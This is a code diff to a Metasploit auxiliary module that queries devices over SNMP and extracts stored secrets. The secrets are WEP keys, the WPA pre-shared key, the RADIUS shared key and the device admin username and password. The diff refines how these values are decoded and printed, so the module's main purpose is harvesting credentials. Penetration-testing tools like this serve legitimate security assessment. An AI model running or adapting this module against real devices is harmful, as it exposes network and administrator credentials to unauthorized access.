@@ -38,9 +38,8 @@ class Metasploit3 < Msf::Auxiliary
         "Host IP", "SSID", "802.11 Band", "Network Authentication Mode",
         "WEP Passphrase", "WEP Encryption", "WEP Key 1", "WEP Key 2",
         "WEP Key 3", "WEP Key 4", "Current Network Key", "WPA Encryption",
-        "WPA Pre-Shared Key (PSK)", "Group Key Rotation Interval",
-        "RADIUS Server", "RADIUS Port", "RADIUS Key",
-        "WPA/WPA2 Re-auth Interval", "Device UI Username", "Device UI Password"
+        "WPA Pre-Shared Key (PSK)", "RADIUS Server", "RADIUS Port",
+        "RADIUS Key", "Device UI Username", "Device UI Password"
       ]
 
       output_data = {}
@@ -81,28 +80,25 @@ class Metasploit3 < Msf::Auxiliary
           # get appropriate WEP keys based on wep_encryption setting
           if wep_encryption == 1
             wep_encryption_name = "64-bit"
-            # TODO: need to test what to_s does to the SNMP hex-string
-            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1').to_s
-            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2').to_s
-            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3').to_s
-            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4').to_s
+            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1')
+            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2')
+            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3')
+            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4')
           elsif wep_encryption == 2
             wep_encryption_name = "128-bit"
-            # TODO: need to test what to_s does to the SNMP hex-string
-            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1').to_s
-            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2').to_s
-            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3').to_s
-            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4').to_s
+            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1')
+            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2')
+            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3')
+            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4')
           end
           output_data["WEP Encryption"] = wep_encryption_name
-          output_data["WEP Key 1"] = wep_key1.strip
-          output_data["WEP Key 2"] = wep_key2.strip
-          output_data["WEP Key 3"] = wep_key3.strip
-          output_data["WEP Key 4"] = wep_key4.strip
+          output_data["WEP Key 1"] = wep_key1.unpack('H*')[0]
+          output_data["WEP Key 2"] = wep_key2.unpack('H*')[0]
+          output_data["WEP Key 3"] = wep_key3.unpack('H*')[0]
+          output_data["WEP Key 4"] = wep_key4.unpack('H*')[0]
 
           # get current network key
-          # TODO: need to test what to_i does to Gauge32: Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
-          currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_i
+          currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_s
           output_data["Current Network Key"] = currentKey
 
           if network_auth_mode == 6
@@ -167,7 +163,6 @@ class Metasploit3 < Msf::Auxiliary
         }
 
         print_line(line)
-        #print_line("")
       end
 
     rescue SNMP::RequestTimeout
@@ -237,13 +232,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_radius_info(snmp, output_data)
-    radius_server = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.32').to_s
-    # TODO: Hex-STRING IP Address hex value of each octet, convert hex octets to IP address 
-    output_data["RADIUS Server"] = radius_server.strip
+    radius_server = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.32')
+    output_data["RADIUS Server"] = radius_server.unpack("C4").join(".")
 
-    radius_port = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.32').to_i
-    # TODO does Gauge32 convert to int?
-    output_data["RADIUS Port"] = radius_port
+    radius_port = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.32').to_s
+    output_data["RADIUS Port"] = radius_port.strip
 
     radius_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.32').to_s
     output_data["RADIUS Key"] = radius_key.strip
